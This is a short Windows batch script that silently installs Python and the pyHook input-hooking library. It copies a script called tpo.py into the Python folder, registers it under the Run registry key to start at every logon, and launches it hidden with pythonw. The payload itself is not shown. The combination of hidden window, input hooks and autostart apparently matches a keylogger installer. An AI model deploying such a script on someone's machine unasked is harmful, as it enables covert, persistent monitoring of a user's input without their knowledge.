@echo off
rem minimize window
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

pushd %~dp0

rem install python
python-3.6.7.exe /quiet InstallAllUsers=1 Shortcuts=0 Include_tcltk=0 PrependPath=1

rem Refreshing PATH from registry
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path') do set syspath=%%B
for /f "tokens=2*" %%A in ('reg query "HKCU\Environment" /v Path') do set userpath=%%B
set PATH=%userpath%;%syspath%

pip install pyHook-1.5.1-cp36-cp36m-win32.whl

pip install pywin32-224-cp36-cp36m-win32.whl

pip install pypiwin32-223-py3-none-any.whl

rem copy tpo.py
copy tpo.py "%ProgramFiles(x86)%\Python36-32"

rem Add to windows registry:
%SystemRoot%\System32\reg.exe ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Python TPO" /t REG_SZ /d "\"%ProgramFiles(x86)%\Python36-32\pythonw.exe\" \"%ProgramFiles(x86)%\Python36-32\tpo.py\"" /f

start "" "%ProgramFiles(x86)%\Python36-32\pythonw.exe" "%ProgramFiles(x86)%\Python36-32\tpo.py"

exit


